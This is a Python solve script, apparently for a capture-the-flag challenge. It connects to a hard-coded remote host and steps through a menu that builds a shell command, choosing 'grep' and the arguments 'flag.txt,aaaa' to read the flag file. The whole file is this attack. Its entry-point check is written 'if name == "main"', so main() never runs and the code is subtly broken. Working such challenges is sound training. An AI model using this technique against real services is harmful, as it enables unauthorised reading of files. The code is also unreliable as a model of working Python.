#!/usr/bin/env python3
import socket
import time

HOST = "154.57.164.68"
PORT = 31363

def recv_until(sock, marker, timeout=10):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def sendline(sock, s):
    if isinstance(s, str):
        s = s.encode()
    sock.sendall(s + b"\n")
    time.sleep(0.2)

def main():
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        print(recv_until(sock, b"> ").decode(errors="ignore"))

        sendline(sock, "1")
        print(recv_until(sock, b"(mode)> ").decode(errors="ignore"))
        sendline(sock, "~0")

        print(recv_until(sock, b"> ").decode(errors="ignore"))
        sendline(sock, "2")
        print(recv_until(sock, b"(bin)> ").decode(errors="ignore"))
        sendline(sock, "grep")

        print(recv_until(sock, b"> ").decode(errors="ignore"))
        sendline(sock, "3")
        print(recv_until(sock, b"(arg1,arg2)> ").decode(errors="ignore"))
        sendline(sock, "flag.txt,aaaa")

        print(recv_until(sock, b"> ").decode(errors="ignore"))
        sendline(sock, "4")
        print(recv_until(sock, b"(switch1,switch2)> ").decode(errors="ignore"))
        sendline(sock, "ZZZ,ZZZ")

        print(recv_until(sock, b"> ").decode(errors="ignore"))
        sendline(sock, "5")

        time.sleep(1)
        out = b""
        sock.settimeout(3)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                out += chunk
        except Exception:
            pass

        print(out.decode(errors="ignore"))

if name == "main":
    main()
